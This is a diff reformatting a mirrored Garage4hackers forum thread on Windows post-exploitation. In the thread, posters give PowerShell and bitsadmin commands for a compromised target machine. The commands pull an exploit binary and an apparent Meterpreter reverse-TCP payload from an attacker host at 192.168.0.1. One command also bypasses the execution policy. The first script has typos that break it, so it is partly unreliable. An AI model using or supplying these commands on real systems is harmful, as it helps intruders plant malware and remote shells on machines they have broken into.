@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=6880&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:17:13 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6880&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:17:13 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Post Exploitation - wget using windows powershell and bitsadmin on target machine</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,36 +41,36 @@
 		<div class="title">Post Exploitation - wget using windows powershell and bitsadmin on target machine</div>
 	
 	<div class="content">
-		<blockquote class="restore">Assumptions: <br />
-1) You got access on the windows system which support the Powershell and Bitsadmin <br />
-Please note that bitsadmin is no logger supported on the windows, instead of bitsadmin we can use the powershell. <br />
- <br />
-Execute the following command on the target machine's limited shell <br />
-<br />
+		<blockquote class="restore">Assumptions: <br/>
+1) You got access on the windows system which support the Powershell and Bitsadmin <br/>
+Please note that bitsadmin is no logger supported on the windows, instead of bitsadmin we can use the powershell. <br/>
+ <br/>
+Execute the following command on the target machine's limited shell <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">echo $storageDir = $pwd &gt; wget.ps1<br />
-echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br />
-echo $url = &quot;http://192.168.0.1/winExp.exe&quot; &gt;&gt;wget.ps1<br />
-echo $webliclient.DownloadFile($url, $file) &gt;&gt;wget.ps1<br />
-echo $storageDir = $pwd &gt; wget.ps1</code><hr />
-</div>Now, our wget.ps1 is ready for action i.e. now it should help attacker to transfer the exploit on the target windows machine. <br />
-<br />
+	<hr/><code class="bbcode_code">echo $storageDir = $pwd &gt; wget.ps1<br/>
+echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br/>
+echo $url = "http://192.168.0.1/winExp.exe" &gt;&gt;wget.ps1<br/>
+echo $webliclient.DownloadFile($url, $file) &gt;&gt;wget.ps1<br/>
+echo $storageDir = $pwd &gt; wget.ps1</code><hr/>
+</div>Now, our wget.ps1 is ready for action i.e. now it should help attacker to transfer the exploit on the target windows machine. <br/>
+<br/>
 you can cross verify the wget.ps1 using <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">TYPE</code><hr />
-</div> command.<br />
-<br />
-Now lets download file the using below given power-shell command. <br />
-<br />
+	<hr/><code class="bbcode_code">TYPE</code><hr/>
+</div> command.<br/>
+<br/>
+Now lets download file the using below given power-shell command. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</code><hr />
-</div>In some other cases some of the lower version of the windows doesn't support powershell. In this case you can use the bitsadmin utility to download the file in the target machine's directory. <br />
-<br />
+	<hr/><code class="bbcode_code">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</code><hr/>
+</div>In some other cases some of the lower version of the windows doesn't support powershell. In this case you can use the bitsadmin utility to download the file in the target machine's directory. <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">bitsadmin /transfer myDownloadJob http://192.168.0.1/winExp.exe c:\Users\g4h\Desktop1.exe</code><hr />
+	<hr/><code class="bbcode_code">bitsadmin /transfer myDownloadJob http://192.168.0.1/winExp.exe c:\Users\g4h\Desktop1.exe</code><hr/>
 </div></blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -84,11 +81,11 @@ Now lets download file the using below given power-shell command. <br />
 	
 	
 	<div class="content">
-		<blockquote class="restore">There is another oneliner file downloader in Powershell : <br />
-<br />
+		<blockquote class="restore">There is another oneliner file downloader in Powershell : <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">$storageDir = $pwd $webclient = New-Object System.Net.WebClient $url = &quot;http://192.168.0.1/met_revtcp_38_443.exe&quot; $file = &quot;met.exe&quot; $webclient.DownloadFile($url,$file)</code><hr />
+	<hr/><code class="bbcode_code">$storageDir = $pwd $webclient = New-Object System.Net.WebClient $url = "http://192.168.0.1/met_revtcp_38_443.exe" $file = "met.exe" $webclient.DownloadFile($url,$file)</code><hr/>
 </div></blockquote>
 	</div>
 </li>
@@ -97,14 +94,14 @@ Now lets download file the using below given power-shell command. <br />
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:02 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:02 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -122,7 +119,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6880&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:17:13 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=6880&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:17:13 GMT --></html>
